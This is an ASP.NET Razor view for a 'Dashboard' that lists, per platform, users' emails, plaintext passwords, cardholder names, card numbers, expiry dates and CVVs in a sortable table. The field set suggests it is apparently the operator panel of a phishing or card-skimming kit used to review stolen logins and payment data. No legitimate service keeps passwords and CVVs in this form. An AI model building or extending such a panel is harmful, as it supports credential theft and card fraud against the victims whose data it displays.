@model List<UserModel>
@{
    Layout = "_Layout";
}
<script>
$(document).ready(function (){
  let table = new DataTable('#example');
})
</script>

<h1>Dashboard</h1>
<br>

<table id="example" class="table table-striped table-bordered" style="width:100%">
    <thead>
    <tr>
        <th>Platform</th>
        <th>Email</th>
        <th>Password</th>
        <th>Name on Card</th>
        <th>CC Number</th>
        <th>CC Expire Date</th>
        <th>CC CVV</th>
    </tr>
    </thead>
    <tbody>
    @foreach(var item in Model)
    {
        <tr>
            <td>@item.platform_id</td>
            <td>@item.user_email</td>
            <td>@item.user_password</td>
            <td>@item.user_name_on_card</td>
            <td>@item.user_cc</td>
            <td>@item.user_date</td>
            <td>@item.user_cvv</td>
                   
        </tr>
    }
    </tbody>
                
</table>

